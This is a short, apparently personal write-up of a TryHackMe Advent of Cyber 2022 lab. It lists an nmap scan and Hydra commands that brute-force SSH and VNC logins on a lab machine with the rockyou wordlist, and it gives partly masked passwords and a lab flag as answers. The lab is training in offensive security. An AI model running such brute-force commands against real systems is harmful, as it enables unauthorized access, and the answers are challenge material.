-----------------------------
	TryHackMe!
Advant of Cyber 4 2022
export $IP=10.10.45.218
   Date - 5/12/2022
-----------------------------

-------------------
# Full Forms -->
-------------------

SSH = Secure Shell
RDP = Remote Desktop Protocol
VNC = Virtual Network Computer

---------------------------------------------------
# Scanning Phase (Result is in the directory) --> 
---------------------------------------------------
## NMAP -->
	nmap -vv -sSV 10.10.45.218 -oN nmap/initial

-----------------------------------
# Password Brute Force Atteck -->
-----------------------------------
## Hydra -->
	SSH -->
		hydra -l alexander -P /usr/share/wordlists/rockyou.txt ssh://10.10.45.218
	VNC -->
		hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 16 vnc://10.10.45.218

port 5900 is default for vnc.

------------------------------------------------
## process of stablishing the vnc Connect -->
------------------------------------------------
After Determining the password for vnc i installed a opensource and free application called `Remmina` and then connected through the ip and the password.

### syntax to install the app :--
	`sudo apt install remmina -y`

----------------
# PASSWORDS -->
----------------
## SSH:-->
	s****a

## VNC:-->
	1******r

----------------------------
# Questions & Answers -->
----------------------------

## 1. Use Hydra to find the VNC password of the target with IP address MACHINE_IP. What is the password? -->
----------------------------------------------------------------------------------------------------------------------
--> 1******r

-------------------
## 2. Flag -->
-------------------
-->	THM{I*************EN}

